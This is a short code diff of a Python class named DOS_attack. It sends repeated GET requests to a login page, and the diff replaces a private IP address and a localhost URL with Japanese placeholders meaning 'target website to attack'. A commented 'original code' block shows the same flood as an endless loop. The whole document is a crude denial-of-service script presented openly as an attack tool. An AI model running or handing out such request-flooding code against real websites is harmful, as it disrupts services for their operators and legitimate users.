@@ -4,7 +4,7 @@ class DOS_attack:
     def Da(self):
         count = 0
         while True:
-            requests.get("http://10.8.0.1/login/")
+            requests.get("攻撃対象のWEBサイト")
             count = count + 1
             if count >= 100:
                 print("100回だけ行ったよ")
@@ -20,4 +20,4 @@ class DOS_attack:
 # 本来のコード
 # import requests
 # while True:
-#     requests.get("http://localhost/login/")
+#     requests.get("対象の攻撃サイト")
